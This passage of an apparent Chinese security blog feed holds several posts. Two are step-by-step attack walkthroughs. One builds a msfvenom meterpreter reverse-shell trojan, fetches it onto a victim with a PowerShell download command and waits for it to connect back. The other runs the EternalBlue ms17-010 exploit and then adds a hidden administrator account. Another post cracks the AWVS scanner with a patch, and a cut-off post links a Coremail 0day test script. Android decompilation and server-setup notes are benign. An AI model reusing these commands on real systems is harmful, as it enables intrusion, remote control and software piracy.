title="批量测试脚本"></a><strong>批量测试脚本</strong></h2><p>自己写的简单脚本，大神勿喷，有意见我尽量改<br>**</p><h2 id="请勿用于非法扫描！"><a href="#请勿用于非法扫描！" class="headerlink" title="请勿用于非法扫描！"></a>请勿用于非法扫描！</h2><p>**<br>链接：<a href="https://pan.baidu.com/s/12N_2uJ4w7z_M3d-RZ8tN8Q" target="_blank" rel="noopener">https://pan.baidu.com/s/12N_2uJ4w7z_M3d-RZ8tN8Q</a><br>提取码：n0xx </p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现和分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 0day coremail </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android反编译(apktool、dex2jar、jd-gui）三件套教程</title>
      <link href="/2019/06/14/Android%E5%8F%8D%E7%BC%96%E8%AF%91(apktool%E3%80%81dex2jar%E3%80%81jd-gui%EF%BC%89%E4%B8%89%E4%BB%B6%E5%A5%97%E6%95%99%E7%A8%8B/"/>
      <url>/2019/06/14/Android%E5%8F%8D%E7%BC%96%E8%AF%91(apktool%E3%80%81dex2jar%E3%80%81jd-gui%EF%BC%89%E4%B8%89%E4%BB%B6%E5%A5%97%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="Android反编译-apktool、dex2jar、jd-gui）三件套教程"><a href="#Android反编译-apktool、dex2jar、jd-gui）三件套教程" class="headerlink" title="Android反编译(apktool、dex2jar、jd-gui）三件套教程"></a>Android反编译(apktool、dex2jar、jd-gui）三件套教程</h1><p>这个是网上流行的使用工具，我现在重新写一下屡一下思路</p><p><strong>apk反编译软件有个组合套餐：apktool 、dex2jar、jd-jui，</strong></p><p>我直接打包好了一套工具，也配置好了，使用可以直接用剩的再收集麻烦w<br>这个下载地址：<br><a href="https://download.csdn.net/download/god_zzz/11241989" target="_blank" rel="noopener">https://download.csdn.net/download/god_zzz/11241989</a></p><h2 id="简单介绍一下，大概了解一下各自是干什么的："><a href="#简单介绍一下，大概了解一下各自是干什么的：" class="headerlink" title="简单介绍一下，大概了解一下各自是干什么的："></a>简单介绍一下，大概了解一下各自是干什么的：</h2><p><strong>##    apktool</strong></p><p>可以反编译软件的布局文件、xml文件、AndroidManifest.xml和图片等。</p><p><strong>##    dex2jar</strong></p><p>将apk反编译成java源码，也就是说把classes.dex转化成jar文件，反编译源码</p><p><strong>##     jd-gui</strong><br>源码文件转化成jar文件，这个打开直接查看jar的源码</p><p>**</p><h2 id="开始反编译"><a href="#开始反编译" class="headerlink" title="开始反编译"></a>开始反编译</h2><ul><li>第一步下载好工具和要测试的apk</li><li>然后使用</li><li></li></ul><h2 id="apktool使用注意"><a href="#apktool使用注意" class="headerlink" title="apktool使用注意"></a>apktool使用注意</h2><ul><li>要确保他们三个在一个文件夹里面，然后打开CMD命令把路径切到这里<br><img src="https://img-blog.csdnimg.cn/20190614213145709.png" alt="在这里插入图片描述"></li></ul><p>使用命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apktool d -f  ***.apk</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190614213908118.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2019061421401366.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190614214040881.png" alt="在这里插入图片描述"><br>里面就是所要的文件，第一部分结束</p><h2 id="第二部分–dex2jar反编译源文件"><a href="#第二部分–dex2jar反编译源文件" class="headerlink" title="第二部分–dex2jar反编译源文件"></a>第二部分–dex2jar反编译源文件</h2><ul><li></li><li>找到APK文件，直接右键解压</li><li>解压到新的文件夹，记得解压重新命名要不会覆盖（因为名字一样）</li><li>找到里面的文件  classes.dex</li><li><strong>classes.dex</strong>是我们要的文件</li><li></li><li><img src="https://img-blog.csdnimg.cn/20190614214529909.png" alt="在这里插入图片描述"></li><li></li><li><strong>第二步把classes.dex文件放到dex2jar解压好的文件夹里</strong></li><li></li></ul><p><img src="https://img-blog.csdnimg.cn/2019061421481150.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>##还是要注意 运行命令的实话路径一定要切换到当前路径</p><p>然后输入命令：</p><pre><code>d2j-dex2jar.bat classes.dex</code></pre><p><img src="https://img-blog.csdnimg.cn/20190614215124837.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这样反编译就成功了</p><p>**</p><h2 id="最后一步用JD-GUI查看源码"><a href="#最后一步用JD-GUI查看源码" class="headerlink" title="最后一步用JD-GUI查看源码"></a>最后一步用JD-GUI查看源码</h2><p>**<br>**</p><ul><li>现在有了jar文件</li><li>直接双击打开JD-GUI</li><li>把jar文件直接拖进去就可以看了<br><img src="https://img-blog.csdnimg.cn/20190614215634222.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>**</li></ul><p><strong>##这就是反编译的过程了</strong><br><strong>有一个提醒就行，用命令行有个问题如果生成的文件已经有了就会报错，不会提示你覆盖，所以运行之前最好检查不要有已经存在可能重名的</strong></p>]]></content>
      
      
      <categories>
          
          <category> app渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android 反编译 app渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux版awvs最新版v_190325161的安装记录</title>
      <link href="/2019/06/13/Linux%E7%89%88awvs%E6%9C%80%E6%96%B0%E7%89%88v_190325161%E7%9A%84%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/"/>
      <url>/2019/06/13/Linux%E7%89%88awvs%E6%9C%80%E6%96%B0%E7%89%88v_190325161%E7%9A%84%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>因为之前52的安装教程贴被删除了<br>所以我自己重新记录一下<br>方便以后的使用<br>也是自己用的环境 —-我用的是2019的ubantu和Xshell</p><p>下载地址<a href="https://download.csdn.net/download/god_zzz/11238215" target="_blank" rel="noopener">https://download.csdn.net/download/god_zzz/11238215</a><br>里面有三个：： 一个安装包一个破解文件一个安装说明</p><p>**</p><h2 id="下面开始安装"><a href="#下面开始安装" class="headerlink" title="下面开始安装"></a>下面开始安装</h2><p>**</p><ul><li>安装环境依赖（如果有问题先更新一下源）</li></ul><p><code>root@kali:~# sudo apt-get install libxdamage1 libgtk-3-0 libasound2 libnss3 libxss1 -y</code></p><blockquote><p>正在读取软件包列表… 完成 正在分析软件包的依赖关系树        正在读取状态信息… 完成        libxss1<br>已经是最新版 (1:1.2.3-1)。 libxss1 已设置为手动安装。 将会同时安装下列软件：   libasound2-data<br>libgtk-3-common libxdamage-dev 建议安装：   alsa-utils 下列软件包将被升级：<br>libasound2 libasound2-data libgtk-3-0 libgtk-3-common libnss3<br>libxdamage-dev libxdamage1 升级了 7 个软件包，新安装了 0 个软件包，要卸载 0 个软件包，有 1115<br>个软件包未被升级。 … … …</p><p>正在处理用于 libc-bin (2.28-2) 的触发器 …</p></blockquote><p> <strong>第二部传文件</strong></p><ul><li><strong>传文件</strong></li></ul><p>r<br>    root@kali:/home# ls</p><pre><code>root@kali:/home# rz                           我用的Xshell直接传root@kali:/home# ls</code></pre><p>acunetix_trial.sh  AWVS12-Linux.zip  Linux_Awvs安装说明.txt  patch_awvs</p><ul><li><p><strong>&gt; 改文件的操作权限@@@@@@@@@</strong></p><p> root@kali:/home# chmod u+x *</p><p> root@kali:/home# ls</p></li></ul><p>acunetix_trial.sh  AWVS12-Linux.zip  Linux_Awvs安装说明.txt  patch_awvs（全绿可执行）</p><p> <strong>- 安装开始</strong></p><ul><li>中间输入用户名密码</li></ul><pre><code>root@kali:/home# ./acunetix_trial.sh</code></pre><blockquote><p>交互式输入用户信息:</p><ol><li>是否同意协议:yes</li><li>输入主机名:</li><li>输入管理员邮箱:<a href="mailto:xxx@xxx.com">xxx@xxx.com</a> 就是用户名</li><li>输入密码:!Q2w3e4r </li></ol></blockquote><ul><li><p>安装结束后访问:<br><a href="https://ip:13443/" target="_blank" rel="noopener">https://ip:13443/</a>                当然kali你的IP地址<br><img src="https://img-blog.csdnimg.cn/20190612172401116.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li><li><p>安装pojie文件</p></li><li><p>##</p><p>  ##拷贝 patch_awvs 到后面得安装目录<br>  root@Nessus: cp patch_awvs /home/acunetix/.acunetix_trial/v_190325161/scanner/       </p><h2 id="找到安装目录里面去"><a href="#找到安装目录里面去" class="headerlink" title="找到安装目录里面去"></a>找到安装目录里面去</h2><p>  root@Nessus:cd /home/acunetix/.acunetix_trial/v_190325161/scanner</p><h2 id="必须在里面运行"><a href="#必须在里面运行" class="headerlink" title="必须在里面运行"></a>必须在里面运行</h2><p>  root@Nessus:/home/acunetix/.acunetix_trial/v_190325161/scanner# ./patch_awvs </p></li></ul><p><img src="https://img-blog.csdnimg.cn/20190612185624234.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>安装成功</p><p>检查是否成功:<br>登录系统后, 点击右上角的”Administrator-&gt;Profile-&gt;License”,可以看到99999就说明成功激活</p><p> 修改不检查更新:<br>登录系统后,左下角Settings-&gt;ProductUpgrades,改为”Do not automaticaly check for update[Not Recommanded]”</p>]]></content>
      
      
      <categories>
          
          <category> 配环境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWVS 破解 Linux 无限 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSF木马的简单利用</title>
      <link href="/2019/06/06/MSF%E6%9C%A8%E9%A9%AC%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/"/>
      <url>/2019/06/06/MSF%E6%9C%A8%E9%A9%AC%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>刚刚试了下永恒之蓝，看到有人用木马，也补一下后面的其他<br>环境和那一片的一样</p><ol><li>msfvenom模块，首先生成.exe木马文件</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;10.77.0.109 lport&#x3D;4443f exe &gt;&#x2F;root&#x2F;1.exe</span><br></pre></td></tr></table></figure><p>1.exe 就是木马 要把这个用各种方法去受害机运行</p><p><img src="https://img-blog.csdnimg.cn/2019060616093520.png" alt="在这里插入图片描述"><br> 2. 输入msfconsole进入metasploi<br> 3. 进入监听模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br></pre></td></tr></table></figure><ol start="4"><li>设置payload反弹</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br></pre></td></tr></table></figure><ol start="5"><li>设置监听ip端口</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set lhost 10.77.0.109</span><br><span class="line">set lport 4443</span><br><span class="line">要与木马一致</span><br></pre></td></tr></table></figure><ol start="6"><li>运行<img src="https://img-blog.csdnimg.cn/20190606161629689.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>kali这边就准备完了，等待上线</li></ol><h2 id="在目标主机运行-1-exe-木马"><a href="#在目标主机运行-1-exe-木马" class="headerlink" title="在目标主机运行 1.exe 木马"></a>在目标主机运行 1.exe 木马</h2><p>利用是之前的ms17010直接shell</p><pre><code>powershell (new-object System.Net.WebClient).DownloadFile( &apos;http://10.77.0.100/1.exe&apos;,&apos;c:\1.exe&apos;)</code></pre><p><img src="https://img-blog.csdnimg.cn/20190606164405347.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>上线成功</p><p>后续的。。再写</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现和分析 利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MSF木马 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>试试MSF的ms17-010永恒之蓝漏洞利用</title>
      <link href="/2019/06/06/%E8%AF%95%E8%AF%95MSF%E7%9A%84ms17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
      <url>/2019/06/06/%E8%AF%95%E8%AF%95MSF%E7%9A%84ms17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="试验环境"><a href="#试验环境" class="headerlink" title="试验环境"></a>试验环境</h2><p>(内网地址)</p><ul><li>-win7（未打补丁开445）      10.77.0.128   <ul><li>kali             10.77.0.109</li></ul></li></ul><h2 id="首先信息收集，探测"><a href="#首先信息收集，探测" class="headerlink" title="首先信息收集，探测"></a>首先信息收集，探测</h2><ul><li>nmap意思一下</li></ul><blockquote><p> <code>- nmap -sS -P0 -A -v 10.77.0.100</code></p></blockquote><p><img src="https://img-blog.csdnimg.cn/20190606120817590.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="开的445"></p><h2 id="扫描漏洞"><a href="#扫描漏洞" class="headerlink" title="扫描漏洞"></a>扫描漏洞</h2><ul><li>msfconsole   启动</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure><ul><li>加载扫描exp</li></ul><blockquote><p><code>use auxiliary/scanner/smb/smb_ms17_010</code></p></blockquote><pre><code>show options</code></pre><p><img src="https://img-blog.csdnimg.cn/20190606135637929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>设置目标ip</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set RHOST 10.77.0.128</span><br></pre></td></tr></table></figure><ul><li>运行</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190606140644531.png" alt="在这里插入图片描述">发现可以利用</p><hr><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul><li>加载攻击模块</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue</span><br></pre></td></tr></table></figure><ul><li>设置参数</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set RHOST 10.77.0.128</span><br></pre></td></tr></table></figure><ul><li>运行</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190606142202832.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>运行成功 进去了</p><p>可以直接CMD命令<br><img src="https://img-blog.csdnimg.cn/20190606142721340.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr><p>权限很高<br>直接net user</p><pre><code>net user 123 1234 /add（用户名 密码）net localgroup administrators xxxx /add （将用户设置为管理员权限）</code></pre><p>重新打开一个终端 </p><pre><code>rdesktop+IP</code></pre><p><img src="https://img-blog.csdnimg.cn/20190606144604550.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现和分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 永恒之蓝 MSF ms17-010 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vmtools坑</title>
      <link href="/2019/06/04/vmtools%E5%9D%91/"/>
      <url>/2019/06/04/vmtools%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p><strong>ubantu</strong></p><hr><p>但是………….第一步：sudo apt-get autoremove open-vm-tools就告诉我，我没安装open-vm-tools</p><p>所以…………..就直接把open-vm-tools装上吧……………..</p><p><code>sudo apt-get install open-vm-tools-desktop</code></p><hr><hr><h2 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h2><p>原来Kali2.0的官网早就有说明，官方自己开发了一个vmtools工具，好崩溃<del>~</del></p><p><code>apt-get install open-vm-tools-desktop fuse</code></p><hr>]]></content>
      
      
      <categories>
          
          <category> 配环境 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Centos7 安装uwsgi失败</title>
      <link href="/2019/05/13/Centos7%20%E5%AE%89%E8%A3%85uwsgi%E5%A4%B1%E8%B4%A5/"/>
      <url>/2019/05/13/Centos7%20%E5%AE%89%E8%A3%85uwsgi%E5%A4%B1%E8%B4%A5/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>centos7 安装uwsgi失败</p><h2 id="失败过程"><a href="#失败过程" class="headerlink" title="失败过程"></a>失败过程</h2><p>我是Centos 直接安装没有其他操作</p><p>按照网上部署部署uwsgi+nginx+django 教程</p><p>@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</p><p>安装Python包管理<br>easy_install 包 <a href="https://pypi.python.org/pypi/distribute" target="_blank" rel="noopener">https://pypi.python.org/pypi/distribute</a></p><p>安装步骤:</p><pre><code>&gt; cd ~ wget&gt; https://pypi.python.org/packages/source/d/distribute/distribute-0.6.49.tar.gz&gt; tar xf distribute-0.6.49.tar.gz cd distribute-0.6.49 python2.7&gt; setup.py install easy_install --version pip 包:&gt; https://pypi.python.org/pypi/pip</code></pre><p>发现没有自带没有安装 pip yum了pip<br>之后<br>使用pip安装<br>    pip install uwsgi<br>报错一直没有解决<br>错误代码<br>ERROR: Command “/usr/bin/python2 -u -c ‘import setuptools, tokenize;<strong>file</strong>=’”‘“‘/tmp/pip-install-WeDbCr/uwsgi/setup.py’”‘“‘;f=getattr(tokenize, ‘“‘“‘open’”‘“‘, open)(<strong>file</strong>);code=f.read().replace(‘“‘“‘\r\n’”‘“‘, ‘“‘“‘\n’”‘“‘);f.close();exec(compile(code, <strong>file</strong>, ‘“‘“‘exec’”‘“‘))’ install –record /tmp/pip-record-ySrxMo/install-record.txt –single-version-externally-managed –compile” failed with error code 1 in /tmp/pip-install-WeDbCr/uwsgi/</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><ol><li>使用python3  安装uwsgi</li><li>在centos自带的Python2下  必须同时安装“编译工具”和“python-devel”</li></ol><p>第二种方法代码<br>三步<br>1安装编译工具</p><pre><code>yum install -y gcc* pcre-devel openssl-devel</code></pre><p>正确截图<img src="https://img-blog.csdnimg.cn/20190513172343638.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>2安装python依赖</p><pre><code>yum install -y python-devel</code></pre><p>正确截图<br><img src="https://img-blog.csdnimg.cn/20190513172402388.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>2安装uwsgi</p><pre><code>pip install uwsgi</code></pre><p>正确截图<img src="https://img-blog.csdnimg.cn/20190513172421418.png" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 配环境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> centos uwsgi 错误 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
